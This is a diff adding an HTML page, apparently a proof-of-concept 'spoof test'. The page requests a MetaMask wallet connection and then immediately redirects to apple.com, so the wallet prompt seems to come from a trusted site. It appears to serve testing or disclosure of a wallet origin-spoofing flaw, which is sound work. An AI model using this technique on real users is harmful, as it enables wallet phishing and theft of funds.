@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wallet Connect Spoof Test</title>
+</head>
+<body>
+    <h2>Connect to Your Wallet</h2>
+    <button id="connectButton">Connect Wallet</button>
+    <p id="status">Not connected</p>
+
+    <script>
+        async function connectWallet() {
+            if (window.ethereum) {
+                try {
+                    // Start the wallet connection request
+                    const connectPromise = window.ethereum.request({ method: 'eth_requestAccounts' });
+
+                    // Immediately redirect to a trusted domain
+                    window.location.href = "https://apple.com";
+
+                    // Note: This line may not execute fully due to the redirect
+                    const accounts = await connectPromise;
+                    document.getElementById("status").innerText = "Connected: " + accounts[0];
+                } catch (error) {
+                    console.error("Connection error:", error);
+                    document.getElementById("status").innerText = "Connection failed";
+                }
+            } else {
+                alert("Please install MetaMask or a Web3-enabled browser.");
+            }
+        }
+
+        document.getElementById("connectButton").addEventListener("click", connectWallet);
+    </script>
+</body>
+</html>
